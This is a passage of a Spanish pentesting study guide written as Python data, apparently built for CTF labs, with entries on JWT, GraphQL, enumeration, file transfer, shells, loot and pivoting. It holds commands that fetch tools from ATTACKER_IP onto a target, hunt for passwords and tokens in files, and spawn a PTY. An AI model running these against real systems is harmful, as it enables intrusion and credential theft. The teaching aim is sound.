            {"cmd": "python3 -c \"import base64,json; t='$TOKEN'.split('.')[1]; print(json.loads(base64.urlsafe_b64decode(t+'='*(-len(t)%4))))\"", "why": "Inspecciona claims localmente.", "out": "Payload JSON del token."},
            {"cmd": "jwt_tool $TOKEN", "why": "Enumera comprobaciones habituales sobre el JWT.", "out": "Hallazgos y pruebas sugeridas."},
        ],
    },
    {
        "id": "graphql-security",
        "title": "Seguridad de GraphQL",
        "phase": "enumeration",
        "section": "web-apis-y-autorizacion",
        "summary": "Enumerar schema, queries, mutations y controles de autorizacion en GraphQL.",
        "que": "GraphQL concentra muchos recursos en un endpoint y permite seleccionar campos mediante un schema.",
        "porque": "Introspection abierta, resolveres sin autorizacion y consultas costosas amplian la superficie de ataque.",
        "cuando": "Cuando observas /graphql, content-type application/graphql o cuerpos JSON con query.",
        "no_aplica": ["No aplica a APIs REST sin endpoint GraphQL identificable."],
        "confirmacion": "Una peticion valida devuelve datos o errores GraphQL estructurados.",
        "resultado": "Tienes el schema disponible o una lista de operaciones y sabes donde probar permisos y limites.",
        "necesitas": ["endpoint GraphQL", "query de laboratorio", "credenciales si el schema esta protegido"],
        "senales": ["__schema", "query", "mutation", "errors", "data"],
        "pasos": ["Comprueba introspection.", "Enumera queries y mutations.", "Repite operaciones con identidades distintas."],
        "commands": [
            {"cmd": "curl -sS \"$URL/graphql\" -H 'Content-Type: application/json' --data '{\"query\":\"{ __typename }\"}'", "why": "Confirma que el endpoint procesa GraphQL.", "out": "Respuesta data o error GraphQL."},
            {"cmd": "curl -sS \"$URL/graphql\" -H 'Content-Type: application/json' --data @introspection.json", "why": "Solicita el schema si esta permitido.", "out": "Tipos, campos y operaciones disponibles."},
        ],
    },
    {
        "id": "tcp-vs-udp",
        "title": "TCP frente a UDP",
        "phase": "recon",
        "section": "recon-y-servicios",
        "summary": "Interpretar protocolos y no perder servicios UDP durante el reconocimiento.",
        "que": "TCP confirma una conexion orientada a estado; UDP no establece handshake y requiere sondas especificas.",
        "porque": "Un escaneo TCP completo puede dejar fuera DNS, SNMP, TFTP o servicios de voz expuestos por UDP.",
        "cuando": "Cuando el objetivo parece vacio en TCP o aparecen puertos UDP habituales como 53, 161 o 69.",
        "no_aplica": ["No lo priorices si el alcance solo autoriza TCP y la evidencia confirma que no hay UDP."],
        "confirmacion": "Compara un barrido TCP con una sonda UDP sobre puertos esperados y registra estados open|filtered.",
        "resultado": "Tienes una superficie de red completa y sabes que resultados UDP necesitan una segunda comprobacion.",
        "necesitas": ["IP objetivo", "alcance autorizado", "lista de puertos UDP prioritarios"],
        "senales": ["open|filtered", "53/udp", "161/udp", "sin respuesta TCP"],
        "pasos": ["Escanea TCP.", "Sondea UDP prioritario.", "Enumera cada servicio confirmado."],
        "commands": [
            {"cmd": "nmap -sU -Pn -p 53,69,123,161 $IP", "why": "Comprueba UDP de alto valor sin barrer todo a ciegas.", "out": "Puertos open o open|filtered para profundizar."},
            {"cmd": "nmap -sU -sV -Pn -p <PUERTOS_UDP> $IP", "why": "Identifica versiones en los UDP que merecen seguimiento.", "out": "Banner o respuesta del servicio."},
        ],
    },
    {
        "id": "database-enumeration",
        "title": "Enumeracion de bases de datos",
        "phase": "enumeration",
        "section": "recon-y-servicios",
        "summary": "Reconocer motores, autenticacion, bases visibles y credenciales de servicios de datos.",
        "que": "La enumeracion de una base de datos empieza por version, acceso y permisos antes de intentar extraer datos.",
        "porque": "Una credencial reutilizada o una instancia sin restricciones puede abrir el camino a la aplicacion o al sistema.",
        "cuando": "Cuando aparecen 3306, 1433, 5432, 6379 u otro puerto de base de datos.",
        "no_aplica": ["No aplica si el puerto solo corresponde a un proxy sin backend de datos confirmado."],
        "confirmacion": "Identifica el motor y obtiene una respuesta de autenticacion, incluso si es un rechazo controlado.",
        "resultado": "Sabes que protocolo usar, que cuenta probar y donde buscar secretos de conexion.",
        "necesitas": ["host y puerto", "cliente del motor", "credenciales de laboratorio si existen"],
        "senales": ["banner MySQL/PostgreSQL/MSSQL", "redis-cli", "login required", "version"],
        "pasos": ["Identifica el motor.", "Comprueba acceso anonimo o con credenciales validas.", "Enumera bases y permisos."],
        "commands": [
            {"cmd": "nmap -sV -p 3306,1433,5432,6379 $IP", "why": "Confirma banners y versiones de motores comunes.", "out": "Servicio, version y pistas de autenticacion."},
            {"cmd": "mysql -h $IP -u root -p", "why": "Prueba el cliente MySQL solo con credenciales autorizadas.", "out": "Acceso, rechazo o politica de autenticacion."},
            {"cmd": "redis-cli -h $IP info server", "why": "Comprueba si Redis expone informacion sin autenticacion.", "out": "Version y estado; un acceso abierto requiere documentar impacto."},
        ],
    },
    {
        "id": "file-transfer",
        "title": "Transferencia de ficheros",
        "phase": "access",
        "section": "acceso-inicial",
        "summary": "Mover herramientas y evidencias entre atacante y objetivo de forma reproducible.",
        "que": "La transferencia debe adaptarse al sistema, permisos, red y controles disponibles en el laboratorio.",
        "porque": "Una shell limitada no sirve si no puedes subir un binario, descargar una evidencia o verificar su integridad.",
        "cuando": "Cuando necesitas llevar una herramienta, un script o un archivo de salida al otro extremo.",
        "no_aplica": ["No aplica si todas las pruebas se ejecutan desde una consola remota con herramientas ya disponibles."],
        "confirmacion": "El fichero llega al destino y su hash coincide con el original cuando el caso lo requiere.",
        "resultado": "Puedes elegir un canal de transferencia compatible sin mezclarlo con la logica de explotacion.",
        "necesitas": ["IP y puerto del canal", "ruta de origen y destino", "hash si el binario es sensible"],
        "senales": ["HTTP 200", "bytes recibidos", "certutil", "wget/curl"],
        "pasos": ["Elige canal.", "Transfiere un fichero pequeno de prueba.", "Verifica existencia e integridad."],
        "commands": [
            {"cmd": "python3 -m http.server 8000", "why": "Sirve un directorio local para descargas desde el objetivo.", "out": "Servidor escuchando en el puerto elegido."},
            {"cmd": "curl -o /tmp/tool http://ATTACKER_IP:8000/tool", "why": "Descarga desde una shell Linux cuando curl esta disponible.", "out": "Bytes recibidos y fichero en destino."},
            {"cmd": "certutil -urlcache -split -f http://ATTACKER_IP:8000/tool C:\\Windows\\Temp\\tool.exe", "why": "Alternativa nativa para Windows sin asumir wget.", "out": "Fichero descargado en la ruta indicada."},
        ],
    },
    {
        "id": "shell-troubleshooting",
        "title": "Diagnostico de shells",
        "phase": "access",
        "section": "acceso-inicial",
        "summary": "Resolver timeouts, listeners incorrectos, TTY rota y sesiones que mueren.",
        "que": "Una shell es una cadena de red y proceso: listener, payload, ruta, permisos y terminal deben encajar.",
        "porque": "La mayoria de fallos de reverse shell son de IP, puerto, firewall o TTY, no del payload en si.",
        "cuando": "Cuando la conexion no llega, se cierra al instante o no permite usar comandos interactivos.",
        "no_aplica": ["No aplica a una sesion SSH estable que ya ofrece una terminal completa."],
        "confirmacion": "Comprueba por separado listener, conectividad, proceso remoto y calidad de la TTY.",
        "resultado": "Aíslas la capa que falla y corriges una variable cada vez.",
        "necesitas": ["IP atacante alcanzable", "puerto libre", "shell o comando remoto"],
        "senales": ["connection refused", "timeout", "prompt ausente", "Ctrl+C rompe la shell"],
        "pasos": ["Valida listener e IP.", "Prueba conectividad minima.", "Estabiliza o cambia de canal."],
        "commands": [
            {"cmd": "ss -ltnp | grep 4444", "why": "Confirma que el listener esta abierto en el puerto esperado.", "out": "Proceso escuchando en 0.0.0.0:4444 o interfaz correcta."},
            {"cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", "why": "Crea una pseudo-TTY cuando la shell Linux es interactiva pero limitada.", "out": "Prompt utilizable para completar la estabilizacion."},
        ],
    },
    {
        "id": "secrets-and-loot",
        "title": "Secretos y loot",
        "phase": "access",
        "section": "loot-y-secretos",
        "summary": "Buscar, clasificar y reutilizar secretos sin perder el contexto de donde salieron.",
        "que": "Loot es cualquier evidencia o secreto que cambia tus siguientes decisiones: configs, claves, tokens, hashes y backups.",
        "porque": "Un secreto aislado solo sirve si sabes a que servicio, usuario y alcance pertenece.",
        "cuando": "Tras obtener acceso a ficheros, shares, historiales, variables de entorno o volcados de memoria.",
        "no_aplica": ["No priorices una busqueda masiva si aun no has enumerado rutas y permisos basicos."],
        "confirmacion": "Cada secreto queda asociado a origen, usuario, servicio y prueba de validez autorizada.",
        "resultado": "Tienes un inventario limpio de loot y sabes cual merece probarse primero.",
        "necesitas": ["acceso de lectura", "directorio de trabajo", "regla para no exfiltrar datos innecesarios"],
        "senales": ["password=", "token", ".env", "history", "backup"],
        "pasos": ["Busca con alcance.", "Clasifica por servicio y usuario.", "Valida y documenta reutilizacion."],
        "commands": [
            {"cmd": "grep -RInE 'password|passwd|token|secret|api[_-]?key' /var/www 2>/dev/null", "why": "Busca indicadores comunes en una ruta de aplicacion acotada.", "out": "Ficheros y lineas candidatas para revisar manualmente."},
            {"cmd": "find / -type f \\( -name '.env' -o -name '*history*' -o -name '*.bak' \\) 2>/dev/null", "why": "Localiza fuentes habituales de secretos sin volcar todo el sistema.", "out": "Rutas candidatas y permisos de lectura."},
        ],
    },
    {
        "id": "credential-reuse",
        "title": "Reutilizacion de credenciales",
        "phase": "access",
        "section": "credenciales-y-acceso",
        "summary": "Convertir una credencial validada en nuevas pistas sin hacer spraying indiscriminado.",
        "que": "Reutilizar es probar una credencial concreta en servicios y usuarios relacionados con la evidencia original.",
        "porque": "Los labs y entornos reales repiten passwords entre SSH, SMB, WinRM, paneles y bases de datos.",
        "cuando": "Cuando encuentras una password, hash, clave privada o token con usuario y contexto identificables.",
        "no_aplica": ["No hagas spraying masivo ni pruebes credenciales fuera del alcance autorizado."],
        "confirmacion": "Un login exitoso se confirma con el servicio, usuario y permisos observados.",
        "resultado": "Amplias acceso de forma controlada y sabes que credencial abre cada puerta.",
        "necesitas": ["credencial y usuario", "lista corta de servicios", "politica de bloqueo conocida"],
        "senales": ["SSH success", "SMB [+]", "WinRM prompt", "HTTP 401/200"],
        "pasos": ["Prioriza servicios cercanos.", "Prueba una credencial cada vez.", "Reenumera con el contexto nuevo."],
        "commands": [
            {"cmd": "nxc smb $IP -u $USER -p '$PASS' --shares", "why": "Comprueba la credencial en SMB y enumera shares en una sola peticion.", "out": "Resultado [+]/[-], dominio y permisos por share."},
            {"cmd": "ssh $USER@$IP", "why": "Prueba acceso SSH cuando la evidencia apunta a Linux.", "out": "Shell o rechazo con razon concreta."},
        ],
    },
    {
        "id": "pivot-troubleshooting",
        "title": "Diagnostico de pivoting",
        "phase": "pivot",
        "section": "pivoting",
        "summary": "Comprobar rutas, listeners y alcance cuando el tunel existe pero no llega al servicio interno.",
        "que": "Pivoting depende de que la ruta, el proceso de tunel y el proxy conozcan correctamente cada red.",
        "porque": "Un tunel activo no garantiza que el trafico use la interfaz o el puerto correctos.",
        "cuando": "Cuando ves la maquina pivote pero un servicio interno da timeout o connection refused.",
        "no_aplica": ["No aplica si el objetivo interno es directamente alcanzable desde tu maquina."],
        "confirmacion": "Comprueba interfaz interna, ruta, escucha del proxy y conexion desde el punto correcto.",
        "resultado": "Sabes si falla el tunel, el proxy, la ruta o el servicio objetivo.",
        "necesitas": ["acceso al pivote", "subred interna", "puerto del tunel"],
        "senales": ["timeout", "proxy error", "route missing", "listener activo"],
        "pasos": ["Inspecciona interfaces.", "Comprueba rutas y listener.", "Prueba desde el pivote y desde proxychains."],
        "commands": [
            {"cmd": "ip addr; ip route", "why": "Revela interfaces y redes que realmente ve el pivote.", "out": "Subred interna, gateway y rutas disponibles."},
            {"cmd": "ss -ltnp", "why": "Confirma que el servicio de tunel o proxy escucha donde esperas.", "out": "Puerto, interfaz y proceso propietario."},
            {"cmd": "proxychains -q nmap -Pn -p <PUERTO> <IP_INTERNA>", "why": "Valida el camino completo hacia un servicio interno.", "out": "open, filtered o timeout a traves del proxy."},
        ],
    },
]


PATHS = [
    {
        "id": "web-a-shell",
        "title": "De una web a una shell",
        "summary": "El camino conceptual del pentesting web: entender la inclusion de ficheros, convertirla en ejecucion, la inyeccion SQL y el ataque a WordPress.",
        "concepts": ["lfi", "lfi-a-rce", "sqli", "wordpress"],
    },
    {
        "id": "web-inyecciones-ruta",
        "title": "Web: inyecciones y ejecucion",
        "summary": "SSTI, SSRF, XXE, XSS, subida de ficheros y command injection.",
        "concepts": ["ssti", "ssrf", "xxe", "xss", "file-upload", "command-injection"],
    },
    {
        "id": "web-autorizacion-apis-ruta",
        "title": "Web: autorizacion y APIs",
        "summary": "Modelo de pruebas de API, sesiones, IDOR/BOLA, JWT y GraphQL.",
        "concepts": ["api-testing-model", "auth-session-security", "idor-bola", "jwt-security", "graphql-security"],
    },
    {
        "id": "shells-y-acceso",
        "title": "Shells y acceso inicial",
        "summary": "Ya tienes ejecucion de comandos: como convertirla en una shell usable. Reverse vs bind y por que hay que estabilizar la TTY.",
        "concepts": ["reverse-vs-bind", "tty-stabilization", "file-transfer", "shell-troubleshooting"],
    },
    {
        "id": "privesc-linux-esencial-ruta",
        "title": "Escalada de privilegios en Linux: esencial",
        "summary": "El modelo mental y los vectores mas rentables: enumeracion, sudo, SUID, capabilities, cron y ficheros sensibles.",
        "concepts": [
            "privesc-modelo",
            "enum-privesc-linux",
            "sudo-abuse",
            "suid",
            "capabilities",
            "cron-abuse",
            "writable-sensitive-files",
        ],
    },
    {
        "id": "privesc-linux-avanzada-ruta",
        "title": "Escalada de privilegios en Linux: avanzada",
        "summary": "Vectores menos frecuentes pero igual de reales: PATH, Python, wildcards, LD_PRELOAD, grupos, NFS y kernel (al final, ultimo recurso).",
        "concepts": [
            "path-hijacking",
            "python-library-hijacking",
            "wildcard-injection",
            "sudo-ld-preload",
            "group-abuse-linux",
            "nfs-no-root-squash",
            "kernel-exploits-linux",
        ],
    },
    {
        "id": "recon-red-ruta",
        "title": "Reconocimiento de red",
        "summary": "La primera fase de toda room: de puertos a servicios identificados, antes de enumerar cada uno.",
        "concepts": ["recon-metodologia", "tcp-vs-udp"],
    },
    {
        "id": "enumeracion-servicios-ruta",
        "title": "Enumeracion de servicios",
        "summary": "Cada servicio se enumera distinto. SMB, DNS, FTP, SNMP, NFS, LDAP y SMTP: que mirar en cada uno.",
        "concepts": ["smb-enum", "dns-enum", "ftp-enum", "snmp-enum", "nfs-enum", "ldap-enum", "smtp-enum", "database-enumeration"],
    },
    {
        "id": "credenciales-ruta",
        "title": "Credenciales y hashes",
        "summary": "Conseguir credenciales: fuerza bruta online a un login, o crackear un hash offline; y sobre todo reutilizarlas.",
        "concepts": ["secrets-and-loot", "cracking", "fuerza-bruta-online", "credential-reuse"],
    },
    {
        "id": "cve-ruta",
        "title": "Exploits y CVEs",
        "summary": "Aprovechar vulnerabilidades publicas sin ejecutar basura a ciegas ni romper la maquina.",
        "concepts": ["explotar-cve"],
    },
    {
        "id": "windows-privesc-esencial-ruta",
        "title": "Escalada en Windows: esencial",
        "summary": "El modelo mental y los vectores mas rentables: enumeracion, privilegios de token, servicios, credenciales y AlwaysInstallElevated.",
        "concepts": [
            "winprivesc-modelo",
            "enum-privesc-windows",
            "token-impersonation",
            "service-misconfig-windows",
            "stored-credentials-windows",
            "always-install-elevated",
        ],
    },
    {
        "id": "windows-privesc-avanzada-ruta",
        "title": "Escalada en Windows: avanzada",
        "summary": "Registro, DLL hijacking, privilegios especiales (SeBackup/SeRestore), UAC y kernel (al final, ultimo recurso).",
        "concepts": [
            "registry-autoruns",
            "dll-hijacking",
            "sebackup-serestore",
            "uac-bypass",
            "kernel-exploits-windows",
        ],
    },
    {
        "id": "active-directory-ruta",
        "title": "Active Directory",
        "summary": "El cambio de mentalidad: transformar identidad en permisos. Modelo, Kerberos y su roasting, hashes NTLM y el grafo de BloodHound.",
        "concepts": ["ad-modelo", "kerberos", "asrep-kerberoast", "ntlm-pth", "bloodhound"],
    },
    {
        "id": "pivoting-ruta",
        "title": "Pivoting",
        "summary": "Cuando la maquina comprometida ve una red interna que tu no alcanzas: usarla de puente con tuneles.",
        "concepts": ["pivoting-tunel", "pivot-troubleshooting"],
    },
]
